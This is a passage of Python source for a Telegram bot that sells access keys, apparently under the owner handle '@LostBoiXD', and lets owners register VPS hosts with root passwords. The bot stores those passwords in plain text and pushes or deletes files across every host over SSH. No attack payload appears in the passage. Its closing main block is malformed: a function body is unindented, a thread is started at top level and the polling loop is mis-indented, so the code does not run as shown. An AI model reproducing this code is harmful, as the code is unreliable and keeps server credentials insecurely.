                "𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐚 𝐧𝐞𝐰 𝐤𝐞𝐲.\n"
                "Contact ᚛ @LostBoiXD ᚜ for assistance."
            )
        else:
            account_info = (
                f"𝕐𝕠𝕦𝕣 𝔸𝕔𝕔𝕠𝕦𝕟𝕥 𝕀𝕟𝕗𝕠𝕣𝕞𝕒𝕥𝕚𝕠𝕟:\n\n"
                f"ᴜꜱᴇʀɴᴀᴍᴇ: {found_user.get('username', 'N/A')}\n"
                f"ᴠᴀʟɪᴅ ᴜɴᴛɪʟ: {valid_until}\n"
                f"ᴘʟᴀɴ: {found_user.get('plan', 'N/A')}\n"
                f"ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴇ: {current_time}"
            )
    else:
        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @LostBoiXD ᚜."

    bot.send_message(message.chat.id, account_info)

# VPS Management Commands
@bot.message_handler(commands=['addvps'])
def add_vps_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You are not authorized to add VPS.*", parse_mode='Markdown')
        return
    
    bot.send_message(chat_id, 
        "*Please provide VPS details in this format:*\n\n"
        "`<name> <ip> <username> <password>`\n\n"
        "Example:\n"
        "`myvps 123.123.123.123 root password123`", 
        parse_mode='Markdown')
    
    bot.register_next_step_handler(message, process_add_vps)

def process_add_vps(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    try:
        args = message.text.split()
        if len(args) != 4:
            bot.send_message(chat_id, "*Invalid format. Please provide exactly 4 arguments.*", parse_mode='Markdown')
            return
            
        name, ip, username, password = args
        
        # Test SSH connection to verify credentials
        success, output = ssh_execute(ip, username, password, "echo 'Connection test'")
        if not success:
            bot.send_message(chat_id, f"*Failed to connect to VPS:*\n`{output}`", parse_mode='Markdown')
            return
        
        # Add to VPS data
        vps_data = load_vps_data()
        vps_data['vps'][name] = {
            'ip': ip,
            'username': username,
            'password': password,
            'added_by': user_id,
            'added_date': datetime.now().isoformat()
        }
        
        if save_vps_data(vps_data):
            bot.send_message(chat_id, f"*VPS added successfully!*\n\nName: `{name}`\nIP: `{ip}`", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*Failed to save VPS data.*", parse_mode='Markdown')
            
    except Exception as e:
        logger.error(f"Error in add_vps_command: {e}")
        bot.send_message(chat_id, "*An error occurred while adding VPS.*", parse_mode='Markdown')

@bot.message_handler(commands=['listvps'])
def list_vps_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You are not authorized to list VPS.*", parse_mode='Markdown')
        return
    
    vps_data = load_vps_data()
    if not vps_data['vps']:
        bot.send_message(chat_id, "*No VPS registered.*", parse_mode='Markdown')
        return
    
    response = "*Registered VPS:*\n\n"
    for name, details in vps_data['vps'].items():
        response += f"🔹 *{name}*\nIP: `{details['ip']}`\nUser: `{details['username']}`\nAdded by: `{details['added_by']}`\n\n"
    
    bot.send_message(chat_id, response, parse_mode='Markdown')

@bot.message_handler(commands=['removevps'])
def remove_vps_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You are not authorized to remove VPS.*", parse_mode='Markdown')
        return
    
    cmd_parts = message.text.split()
    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /removevps <name>*", parse_mode='Markdown')
        return
    
    vps_name = cmd_parts[1]
    vps_data = load_vps_data()
    
    if vps_name in vps_data['vps']:
        del vps_data['vps'][vps_name]
        if save_vps_data(vps_data):
            bot.send_message(chat_id, f"*VPS {vps_name} removed successfully.*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*Failed to remove VPS.*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, f"*VPS {vps_name} not found.*", parse_mode='Markdown')

@bot.message_handler(commands=['addowner'])
def add_owner_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You are not authorized to add owners.*", parse_mode='Markdown')
        return
    
    cmd_parts = message.text.split()
    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /addowner <user_id>*", parse_mode='Markdown')
        return
    
    new_owner_id = int(cmd_parts[1])
    owner_data = load_owner_data()
    
    if new_owner_id in OWNER_IDS:
        bot.send_message(chat_id, "*This user is already an owner.*", parse_mode='Markdown')
        return
    
    OWNER_IDS.append(new_owner_id)
    owner_data['owners'].append(new_owner_id)
    
    if save_owner_data(owner_data):
        bot.send_message(chat_id, f"*User {new_owner_id} added as owner successfully.*", parse_mode='Markdown')
        try:
            bot.send_message(new_owner_id, "*🎉 Congratulations! You have been promoted to owner!*", parse_mode='Markdown')
        except:
            pass
    else:
        bot.send_message(chat_id, "*Failed to add owner.*", parse_mode='Markdown')

@bot.message_handler(commands=['addall'])
def add_all_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return
    
    bot.send_message(chat_id, 
        "*Please provide file details in this format:*\n\n"
        "`<local_path> <remote_path>`\n\n"
        "Example:\n"
        "`/home/user/file.txt /root/file.txt`", 
        parse_mode='Markdown')
    
    bot.register_next_step_handler(message, process_add_all)

def process_add_all(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(chat_id, "*Invalid format. Please provide exactly 2 arguments.*", parse_mode='Markdown')
            return
            
        local_path, remote_path = args
        
        # Verify local file exists
        if not os.path.exists(local_path):
            bot.send_message(chat_id, f"*Local file not found:* `{local_path}`", parse_mode='Markdown')
            return
        
        vps_data = load_vps_data()
        if not vps_data['vps']:
            bot.send_message(chat_id, "*No VPS registered to add files to.*", parse_mode='Markdown')
            return
        
        bot.send_message(chat_id, "*Starting file upload to all VPS...*", parse_mode='Markdown')
        
        success_count = 0
        failed_count = 0
        failed_vps = []
        
        for name, details in vps_data['vps'].items():
            ip = details['ip']
            username = details['username']
            password = details['password']
            
            success, output = ssh_upload_file(ip, username, password, local_path, remote_path)
            if success:
                success_count += 1
            else:
                failed_count += 1
                failed_vps.append(f"{name} ({ip}): {output}")
        
        response = (
            f"*File upload completed!*\n\n"
            f"✅ Success: {success_count}\n"
            f"❌ Failed: {failed_count}\n\n"
        )
        
        if failed_vps:
            response += "*Failed VPS:*\n" + "\n".join(f"• {vps}" for vps in failed_vps)
        
        bot.send_message(chat_id, response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error in add_all_command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your request.*", parse_mode='Markdown')

@bot.message_handler(commands=['removeall'])
def remove_all_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return
    
    bot.send_message(chat_id, 
        "*Please provide the remote file path to remove:*\n\n"
        "Example:\n"
        "`/root/file.txt`", 
        parse_mode='Markdown')
    
    bot.register_next_step_handler(message, process_remove_all)

def process_remove_all(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    try:
        remote_path = message.text.strip()
        
        vps_data = load_vps_data()
        if not vps_data['vps']:
            bot.send_message(chat_id, "*No VPS registered to remove files from.*", parse_mode='Markdown')
            return
        
        bot.send_message(chat_id, "*Starting file removal from all VPS...*", parse_mode='Markdown')
        
        success_count = 0
        failed_count = 0
        failed_vps = []
        
        for name, details in vps_data['vps'].items():
            ip = details['ip']
            username = details['username']
            password = details['password']
            
            success, output = ssh_remove_file(ip, username, password, remote_path)
            if success:
                success_count += 1
            else:
                failed_count += 1
                failed_vps.append(f"{name} ({ip}): {output}")
        
        response = (
            f"*File removal completed!*\n\n"
            f"✅ Success: {success_count}\n"
            f"❌ Failed: {failed_count}\n\n"
        )
        
        if failed_vps:
            response += "*Failed VPS:*\n" + "\n".join(f"• {vps}" for vps in failed_vps)
        
        bot.send_message(chat_id, response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error in remove_all_command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your request.*", parse_mode='Markdown')

@bot.message_handler(commands=['showfiles'])
def show_files_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return
    
    cmd_parts = message.text.split()
    remote_path = "."  # Default to current directory
    
    if len(cmd_parts) > 1:
        remote_path = cmd_parts[1]
    
    vps_data = load_vps_data()
    if not vps_data['vps']:
        bot.send_message(chat_id, "*No VPS registered to show files from.*", parse_mode='Markdown')
        return
    
    bot.send_message(chat_id, "*Select VPS to show files from:*", parse_mode='Markdown')
    
    # Create keyboard with VPS names
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    for name in vps_data['vps'].keys():
        markup.add(KeyboardButton(f"/showfiles_vps {name} {remote_path}"))
    
    bot.send_message(chat_id, "Choose a VPS:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text.startswith('/showfiles_vps'))
def show_files_vps_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.send_message(chat_id, "*Invalid format.*", parse_mode='Markdown')
            return
            
        vps_name = parts[1]
        remote_path = parts[2] if len(parts) > 2 else "."
        
        vps_data = load_vps_data()
        if vps_name not in vps_data['vps']:
            bot.send_message(chat_id, f"*VPS {vps_name} not found.*", parse_mode='Markdown')
            return
            
        details = vps_data['vps'][vps_name]
        ip = details['ip']
        username = details['username']
        password = details['password']
        
        success, result = ssh_list_files(ip, username, password, remote_path)
        
        if success:
            if not result:
                response = "*No files found.*"
            else:
                response = f"*Files in {remote_path}:*\n\n" + "\n".join(f"• `{file}`" for file in result[:50])  # Limit to 50 files
                if len(result) > 50:
                    response += f"\n\n...and {len(result)-50} more files"
            bot.send_message(chat_id, response, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, f"*Failed to list files:*\n`{result}`", parse_mode='Markdown')
            
    except Exception as e:
        logger.error(f"Error in show_files_vps_command: {e}")
        bot.send_message(chat_id, "*An error occurred while listing files.*", parse_mode='Markdown')

# Main execution
if __name__ == '__main__':
    print("Bot is running...")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Start the asyncio thread
    def start_asyncio_thread():
    # your async loop logic here
    asyncio.run(main())

# then start the thread
Thread(target=start_asyncio_thread).start()

    while True:
        try:
            bot.polling(timeout=60)
        except ApiTelegramException as e:
            time.sleep(5)
        except Exception as e:
            time.sleep(5)
